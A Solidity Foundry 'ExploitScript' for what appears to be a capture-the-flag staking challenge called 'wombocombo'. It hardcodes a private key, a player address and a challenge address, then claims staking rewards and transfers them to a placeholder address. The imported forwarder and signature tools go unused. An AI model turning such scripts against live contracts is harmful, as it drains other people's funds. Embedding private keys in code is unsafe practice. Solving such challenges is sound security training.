// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import {ECDSA} from "openzeppelin/utils/cryptography/ECDSA.sol";
import {Script, console} from "forge-std/Script.sol";
import {Challenge} from "../src/wombocombo/Challenge.sol";
import {Staking} from "../src/wombocombo/Staking.sol";
import {Forwarder} from "../src/wombocombo/Forwarder.sol";
import {Token} from "../src/wombocombo/Token.sol";

contract ExploitScript is Script {
    uint256 privateKey =
        uint256(
            0xf2943da254bbe913381bb5fe4ae3367316fe4f0c0f244b313fb69a500ebc5798
        );
    address player = address(0x5A8007b147dB6dC6d067cDE329d4a07557aD1c62);
    Challenge public challenge;
    Token public token;
    Token public reward;
    Forwarder public forwarder;
    Staking public staking;

    function setUp() public {
        challenge = Challenge(0x54B0b1a91F529D6E5C6C53DC10D80b79b04F0F98);
        staking = challenge.staking();
        forwarder = challenge.forwarder();
        token = staking.stakingToken();
        reward = staking.rewardsToken();
    }

    function run() public {
        vm.startBroadcast();
        staking.getReward();
        reward.transfer(address(0x123), reward.balanceOf(player));
        vm.stopBroadcast();
    }
}
